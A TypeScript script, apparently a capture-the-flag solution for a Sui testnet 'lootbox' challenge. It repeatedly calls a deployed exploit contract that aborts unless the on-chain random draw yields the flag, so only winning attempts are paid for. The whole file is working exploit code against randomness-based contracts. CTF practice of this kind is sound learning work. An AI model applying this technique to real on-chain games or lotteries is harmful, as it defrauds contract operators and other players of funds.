import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const EXPLOIT_PACKAGE_ID = '0x3a9f5084ac3c28ee5b0dc2b5c2edd5cb5abf6662ae05746754b2677f0719667a';
const USDC_TYPE = '0xa1ec7fc00a6f40db9693ad1415d0c193ad3906494428cf252621037bd7117e29::usdc::USDC';
const RANDOM_ID = '0x8'; // Sui system Random object
const REQUIRED_PAYMENT = 15_000_000; // 15 USDC (6 decimals)

const MAX_ATTEMPTS = 20;

(async () => {
  const address = keypair.getPublicKey().toSuiAddress();
  console.log(`Address: ${address}`);

  // Check USDC balance using gRPC API
  const balanceResult = await suiClient.getBalance({ owner: address, coinType: USDC_TYPE });
  const totalBalance = balanceResult.balance?.coinBalance || balanceResult.balance?.balance || '0';
  console.log(`USDC Balance: ${Number(totalBalance) / 1_000_000} USDC`);

  if (BigInt(totalBalance) < BigInt(REQUIRED_PAYMENT)) {
    console.log('Need at least 15 USDC! Get from https://faucet.circle.com/ (select Sui Testnet)');
    return;
  }

  // Get USDC coins using gRPC API (listCoins returns { objects: [...] })
  const coinsResult = await suiClient.listCoins({ owner: address, coinType: USDC_TYPE });
  const coins = coinsResult.objects || [];
  if (coins.length === 0) {
    console.log('No USDC coins found!');
    return;
  }

  console.log(`Found ${coins.length} USDC coin(s)`);
  console.log(`\nComposition attack: 25% chance per attempt, aborts if no flag (saves USDC)`);
  console.log(`Starting attempts (max ${MAX_ATTEMPTS})...\n`);

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    console.log(`Attempt ${attempt}/${MAX_ATTEMPTS}...`);

    try {
      // Re-fetch coins each attempt (they may have changed)
      const currentCoinsResult = await suiClient.listCoins({ owner: address, coinType: USDC_TYPE });
      const currentCoins = currentCoinsResult.objects || [];
      if (currentCoins.length === 0) {
        console.log('No USDC coins left!');
        return;
      }

      const tx = new Transaction();

      // Merge all USDC coins if multiple, then split exact payment
      let usdcCoin;
      if (currentCoins.length > 1) {
        const primaryCoin = tx.object(currentCoins[0].objectId);
        const otherCoins = currentCoins.slice(1).map((c: any) => tx.object(c.objectId));
        tx.mergeCoins(primaryCoin, otherCoins);
        [usdcCoin] = tx.splitCoins(primaryCoin, [REQUIRED_PAYMENT]);
      } else {
        [usdcCoin] = tx.splitCoins(tx.object(currentCoins[0].objectId), [REQUIRED_PAYMENT]);
      }

      // Call our exploit contract - aborts if no flag, saving USDC
      tx.moveCall({
        target: `${EXPLOIT_PACKAGE_ID}::lootbox_exploit::try_get_flag`,
        arguments: [
          usdcCoin,
          tx.object(RANDOM_ID),
        ],
      });

      const result = await suiClient.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
      });

      console.log(`SUCCESS! Lootbox flag captured on attempt ${attempt}!`);
      console.log('Result:', JSON.stringify(result, (k,v) => typeof v === 'bigint' ? v.toString() : v));
      return;
    } catch (err: any) {
      const errMsg = err?.message || String(err);
      if (errMsg.includes('MoveAbort') || errMsg.includes('abort')) {
        console.log(`  No flag (tx aborted) - USDC saved! Trying again...`);
      } else {
        console.log(`  Error: ${errMsg.slice(0, 300)}`);
      }
    }

    // Small delay between attempts
    await new Promise(resolve => setTimeout(resolve, 1500));
  }

  console.log(`\nFailed after ${MAX_ATTEMPTS} attempts. Try running again.`);
})();
